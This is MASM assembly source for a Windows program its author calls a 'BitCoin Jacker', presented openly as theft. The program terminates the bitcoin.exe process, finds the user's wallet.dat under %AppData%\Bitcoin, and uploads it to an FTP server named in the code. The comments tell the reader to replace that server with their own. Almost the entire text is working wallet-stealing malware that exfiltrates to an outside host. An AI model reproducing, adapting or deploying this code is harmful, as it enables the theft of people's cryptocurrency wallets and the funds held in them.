; Robin Hood - BitCoin Jacker
; by [ill]will
; steal from the rich and give to the poor
; by dumping the wallet to "public" ftp
;
; Send Me Money if it makes you rich :D
; 14P9t8ceqRzvJ4KhMWnjKQ4TwcLxWwk7j4
; 'randomize' proc found somewhere on the net
; ftp.microsoft.com does not let you upload files
; so change the info and compile with MASM
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

include \masm32\include\masm32rt.inc
include \masm32\include\wininet.inc 
includelib \masm32\lib\wininet.lib
 
FTPit       	PROTO :DWORD,:DWORD,:DWORD
KillMe 		PROTO :DWORD
Randomize 	PROTO
Random 		PROTO :DWORD
ThePort		equ     21

.data
  ftpsite      	db "ftp.microsoft.com",0       	;change the server
  Username     	db "anonymous",0		;change the username
  Password     	db "bitcoin@microsoft.com",0	;change the password
  szTheVictim	db "bitcoin.exe",0
  RandWallet    db "%s-wallet.dat",0
  AppData      	db "AppData",0
  wallet	db "%s\Bitcoin\wallet.dat",0
  random_seed  	dd ?
  res  		dd 0
  sFmt    	db '%u',0
  sBuf    	db 10 dup(0)


.data?
  buffer        db MAX_PATH dup(?)
 WalletPath     db 256  dup(?)
 WalletFTP      db 256  dup(?)
 szBuffer       db 256  dup(?)

.code

start:
         
	invoke  KillMe, addr szTheVictim					 ;kill the bitcoin process
	invoke  Randomize							 ;generate a random number
    	invoke  Random,9999999
    	mov     res,EAX
    	invoke  wsprintf,ADDR sBuf,ADDR sFmt,res				 ;append it to our ftp upload filename
	invoke  wsprintf,addr WalletFTP,addr RandWallet, addr sBuf		 ;ex: 9586293-wallet.dat

	invoke  GetEnvironmentVariable, addr AppData, addr buffer, sizeof buffer ;get the %AppDATA% folder
	invoke  wsprintf,addr WalletPath,addr wallet, addr buffer		 ;append the bitcoin wallet

	invoke  FTPit, addr ftpsite, addr WalletPath,addr WalletFTP		 ; send that shit to a public ftp
	invoke  ExitProcess, 0



FTPit PROC FTPserver:DWORD, lpszFile:DWORD, lpRemoteFile:DWORD
    local hInternet:DWORD
    local ftpHandle:DWORD
    local context:DWORD
    local InternetStatusCallback:DWORD
 invoke InternetOpen,NULL,INTERNET_OPEN_TYPE_PRECONFIG,NULL,NULL,0
     mov hInternet, eax
 invoke InternetConnect,hInternet,FTPserver,ThePort ,\   ;if different port change INTERNET_DEFAULT_FTP_PORT to port #
                      ADDR Username,ADDR Password,INTERNET_SERVICE_FTP,\
                     INTERNET_FLAG_PASSIVE,ADDR context
     mov ftpHandle,eax
 invoke FtpPutFile,ftpHandle,lpszFile,lpRemoteFile,FTP_TRANSFER_TYPE_BINARY,NULL
 invoke InternetCloseHandle,ftpHandle
 invoke InternetCloseHandle, hInternet
    ret
err:
 invoke GetErrDescription,eax
 ret
FTPit endp



Random proc dwBase:dword
  push    ebx  
  mov  eax,dwBase  
  xor  ebx,ebx  
  imul    edx,random_seed,08088405h  
  inc  edx  
  mov  random_seed,edx  
  mul  edx  
  mov  eax,edx  
  pop  ebx  
  ret
Random endp

Randomize proc  
  invoke  GetTickCount
  mov  random_seed,eax  
  ret
Randomize endp

KillMe proc szFile:dword
  LOCAL Process:PROCESSENTRY32

	mov Process.dwSize, sizeof Process
	invoke CreateToolhelp32Snapshot, 2, 0
	 mov esi, eax
	invoke Process32First, esi, addr Process
	@@loop:    
    invoke lstrcmpiA,szFile, addr Process.szExeFile
		test eax, eax
		jnz @@continue
      invoke OpenProcess, 0001h, 0, Process.th32ProcessID
      invoke TerminateProcess, eax, 0
	@@continue:
      invoke Process32Next, esi, addr Process
		test eax, eax
		jz @@done
      jmp @@loop
	@@done:
		invoke CloseHandle, esi
		ret
KillMe endp


end start
